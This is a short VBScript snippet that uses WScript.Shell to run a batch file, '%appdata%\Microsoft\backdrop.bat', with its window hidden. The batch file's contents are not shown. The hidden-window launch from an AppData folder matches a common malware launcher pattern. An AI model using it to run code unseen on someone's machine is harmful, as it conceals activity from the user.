cmd="cmd /c %appdata%\Microsoft\backdrop.bat"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run cmd, 0, True
Set WshShell = Nothing
